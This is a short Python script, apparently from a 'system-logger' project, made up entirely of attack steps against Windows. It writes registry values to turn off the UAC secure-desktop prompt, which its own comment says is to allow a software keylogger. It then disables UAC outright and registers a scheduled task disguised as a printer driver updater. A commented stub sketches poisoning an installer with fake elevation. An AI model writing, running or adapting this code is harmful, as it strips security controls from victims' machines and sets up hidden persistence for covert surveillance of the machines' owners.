from os import system
from subprocess import run

task = "schtasks /create /TN PrinterDriverUpdater /XML C:/Users/lhill23/Documents/GitHub/system-logger/PrinterDriverUpdater.xml"

#Hijacking task scheduler, kinda?
#def InstallerPoisoner(installer, opencmd, cmddelay, scheduler):
    #Create .exe identical to installer, but with fake elevation then execution stuff

def DowngradeUAC():
    #Stop UAC opening on secure desktop, allowing for software keylogger
    system("reg add HKLM/SOFTWARE/Microsoft/Windows/CurrentVersion/Policies/System /f /v PromptOnSecureDesktop /t REG_DWORD /d 0")

def DisableUAC():
    #Straight disable UAC
    system("reg add HKLM/SOFTWARE/Microsoft/Windows/CurrentVersion/Policies/System /f /v EnableLUA /t REG_DWORD /d 0")

#Drivers?

if __name__ == "__main__":
    DowngradeUAC()
    DisableUAC()
    run(task)